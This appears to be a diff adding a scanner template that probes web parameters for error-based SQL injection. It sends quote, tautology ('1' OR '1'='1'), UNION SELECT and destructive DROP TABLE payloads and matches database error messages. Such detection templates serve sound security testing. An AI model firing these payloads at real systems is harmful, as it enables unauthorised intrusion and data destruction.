@@ -1,0 +1,66 @@
+# SQL Injection Error-Based Detection Module
+
+id: sqli-error-based
+info:
+  name: SQL Injection (Error-Based)
+  author: sif
+  severity: high
+  description: Detects SQL injection via database error messages
+  tags: [sqli, injection, database, owasp-top10]
+
+type: http
+
+http:
+  method: GET
+  paths:
+    - "{{BaseURL}}/?id={{payload}}"
+    - "{{BaseURL}}/?user={{payload}}"
+    - "{{BaseURL}}/?search={{payload}}"
+    - "{{BaseURL}}/?q={{payload}}"
+    - "{{BaseURL}}/?query={{payload}}"
+    - "{{BaseURL}}/?cat={{payload}}"
+
+  payloads:
+    - "'"
+    - "''"
+    - "1'"
+    - "1' OR '1'='1"
+    - "1' OR '1'='1'--"
+    - "1' OR '1'='1'/*"
+    - "1; DROP TABLE--"
+    - "' UNION SELECT NULL--"
+    - "1 AND 1=1"
+    - "1 AND 1=2"
+
+  threads: 10
+
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - "SQL syntax.*MySQL"
+        - "Warning.*mysql_"
+        - "MySqlException"
+        - "valid MySQL result"
+        - "ORA-[0-9]+"
+        - "Oracle.*Driver"
+        - "Oracle.*Error"
+        - "PostgreSQL.*ERROR"
+        - "pg_query.*failed"
+        - "Microsoft SQL Server"
+        - "ODBC SQL Server Driver"
+        - "SQLite3::"
+        - "sqlite_query"
+        - "SQLite/JDBCDriver"
+        - "SQL Server.*Driver"
+        - "Unclosed quotation mark"
+        - "quoted string not properly terminated"
+      condition: or
+
+  extractors:
+    - type: regex
+      name: db_type
+      part: body
+      regex:
+        - "(MySQL|PostgreSQL|Oracle|MSSQL|SQLite|MariaDB)"
+      group: 1
